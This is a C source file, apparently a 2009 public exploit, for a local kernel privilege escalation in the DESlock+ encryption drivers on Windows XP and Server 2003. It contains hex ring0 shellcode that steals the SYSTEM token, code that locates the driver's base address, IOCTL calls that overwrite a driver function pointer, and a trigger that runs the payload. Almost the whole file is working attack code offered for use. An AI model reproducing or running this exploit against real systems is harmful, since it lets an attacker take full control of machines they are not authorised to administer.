/* deslock-vdlptokn.c
 *
 * Copyright (c) 2009 by <mu-b@digit-labs.org>
 *
 * DESlock+ <= 4.1.10 local kernel ring0 SYSTEM exploit
 * by mu-b - Wed 17 Jun 2009
 *
 * - Tested on: vdlptokn.sys 1.0.3.54
 *
 * Compile: MinGW + -lntdll
 *
 * - this exploit is provided for educational purposes _only_. You are free
 *   to use this code in any way you wish provided you do not work for, or
 *   are associated in any way with Portcullis Computer Security Ltd.
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <ddk/ntapi.h>

#define VDLPTOKN_IOCTL    0x00222010
#define DLKFDISK_R_IOCTL  0x80002008
#define DLKFDISK_SLOT     0x00000CF8

#define ARG_SIZE(a)       ((a)/sizeof (void *))

/* Win2k3 SP1/2 - kernel EPROCESS token switcher
 * by mu-b <mu-b@digit-lab.org>
 */
static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\xb0\x18\x02\x00\x00"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xd8\x00\x00\x00"
  "\x89\x88\xd8\x00\x00\x00"
  "\x90";

static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\x70\x44"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xc8\x00\x00\x00"
  "\x89\x88\xc8\x00\x00\x00"
  "\x90";

static unsigned char win32_ret[] =
  "\x31\xff"
  "\xb8\x87\x0c\x00\x00"
  "\xff\xe0"
  "\xcc";

struct ioctl_req {
  CHAR pad[0x24];
  void *ptr;
  CHAR _pad[0x4E - 0x28];
};

static PCHAR
fixup_ring0_shell (PVOID base, DWORD ppid, DWORD *zlen)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion = GetVersion ();
  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion != 5)
    {
      fprintf (stderr, "* GetVersion, unsupported version\n");
      exit (EXIT_FAILURE);
    }

  *(PDWORD) &win32_ret[3] += (DWORD) base;

  switch (dwMinorVersion)
    {
      case 1:
        *zlen = sizeof winxp_ring0_shell - 1;
        *(PDWORD) &winxp_ring0_shell[55] = ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen = sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &win2k3_ring0_shell[58] = ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, "* GetVersion, unsupported version\n");
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

static PVOID
get_module_base (void)
{
  PSYSTEM_MODULE_INFORMATION_ENTRY pModuleBase;
  PSYSTEM_MODULE_INFORMATION pModuleInfo;
  DWORD i, num_modules, status, rlen;
  PVOID result;

  status = NtQuerySystemInformation (SystemModuleInformation, NULL, 0, &rlen);
  if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
      exit (EXIT_FAILURE);
    }

  pModuleInfo = (PSYSTEM_MODULE_INFORMATION) HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, rlen);

  status = NtQuerySystemInformation (SystemModuleInformation, pModuleInfo, rlen, &rlen);
  if (status != STATUS_SUCCESS)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
      exit (EXIT_FAILURE);
    }

  num_modules = pModuleInfo->Count;
  pModuleBase = &pModuleInfo->Module[0];
  result = NULL;

  for (i = 0; i < num_modules; i++, pModuleBase++)
    if (strstr (pModuleBase->ImageName, "dlkfdisk.sys"))
      {
        result = pModuleBase->Base;
        break;
      }

  HeapFree (GetProcessHeap (), HEAP_NO_SERIALIZE, pModuleInfo);

  return (result);
}

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  DWORD dResult, i, rlen, zpage_len, zlen, ppid;
  LPVOID zpage, zbuf, base;
  CHAR rbuf[0x2D];
  HANDLE hFile;
  BOOL bResult;

  printf ("DESlock+ <= 4.0.3 local kernel ring0 SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <processid to elevate>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid = atoi (argv[1]);

  fflush (stdout);
  hFile = CreateFileA ("\\\\.\\DLPTokenWalter0", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  zpage_len = 0x10000;
  zpage = (LPVOID) 0x55550000;
  dResult = NtAllocateVirtualMemory ((HANDLE) -1, &zpage, 0, &zpage_len,
                                     MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
  if (dResult != STATUS_SUCCESS)
    {
      fprintf (stderr, "* NtAllocateVirtualMemory failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated page: 0x%08X [%d-bytes]\n",
          zpage, zpage_len);

  base = get_module_base ();
  if (base == NULL)
    {
      fprintf (stderr, "* unable to find dlkfdisk.sys base\n");
      exit (EXIT_FAILURE);
    }
  printf ("* dlkfdisk.sys base: 0x%08X\n", base);

  memset (zpage, 0xCC, zpage_len);
  zbuf = fixup_ring0_shell (base, ppid, &zlen);

  zpage += 0x5555;
  memcpy ((LPVOID) zpage, zbuf, zlen);
  memcpy ((LPVOID) (zpage + zlen),
          win32_ret, sizeof (win32_ret) - 1);

  printf ("* overwriting [@0x%08X %d-bytes].. ",
          base + DLKFDISK_SLOT, 4);
  for (i = 0; i < 4; i++)
    {
      memset (&req, 0, sizeof req);
      req.ptr = (void *) (base + DLKFDISK_SLOT) + i;

      bResult = DeviceIoControl (hFile, VDLPTOKN_IOCTL,
                                 &req, sizeof req, &req, sizeof req, &rlen, 0);
      if (!bResult)
        {
          fprintf (stderr, "* DeviceIoControl failed\n");
          exit (EXIT_FAILURE);
        }
    }
  printf ("done\n");

  CloseHandle (hFile);

  hFile = CreateFileA ("\\\\.\\DLKFDisk_Control", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  /* jump to our address :) */
  printf ("* jumping.. ");

  bResult = DeviceIoControl (hFile, DLKFDISK_R_IOCTL,
                             rbuf, sizeof rbuf, rbuf, sizeof rbuf, &rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, "DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n"
          "* hmmm, you didn't STOP the box?!?!\n");

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}
